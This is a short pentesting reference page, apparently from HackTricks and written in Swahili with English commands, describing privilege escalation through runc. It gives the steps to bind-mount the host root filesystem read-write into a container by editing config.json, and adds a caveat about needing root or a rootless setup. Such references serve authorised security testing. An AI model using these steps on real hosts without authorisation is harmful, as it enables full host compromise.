# RunC Privilege Escalation

{{#include ../../banners/hacktricks-training.md}}

## Basic information

Ikiwa ungependa kujifunza zaidi kuhusu **runc**, angalia ukurasa ufuatao:

{{#ref}}
../../network-services-pentesting/2375-pentesting-docker.md
{{#endref}}

## PE

Ukigundua kuwa `runc` imesakinishwa kwenye host, huenda ukaweza **kuendesha container inayomount root / folder ya host**.
```bash
runc -help #Get help and see if runc is intalled
runc spec #This will create the config.json file in your current folder

Inside the "mounts" section of the create config.json add the following lines:
{
"type": "bind",
"source": "/",
"destination": "/",
"options": [
"rbind",
"rw",
"rprivate"
]
},

#Once you have modified the config.json file, create the folder rootfs in the same directory
mkdir rootfs

# Finally, start the container
# The root folder is the one from the host
runc run demo
```
> [!CAUTION]
> Hii haitafanya kazi kila mara kwa kuwa operesheni chaguo-msingi ya runc ni kuendesha kama root, hivyo kuiendesha kama mtumiaji asiye na privileges hakuwezi kufanya kazi (isipokuwa uwe na rootless configuration). Kuweka rootless configuration kuwa chaguo-msingi kwa ujumla si wazo zuri kwa sababu kuna vikwazo kadhaa ndani ya rootless containers ambavyo havitumiki nje ya rootless containers.

{{#include ../../banners/hacktricks-training.md}}
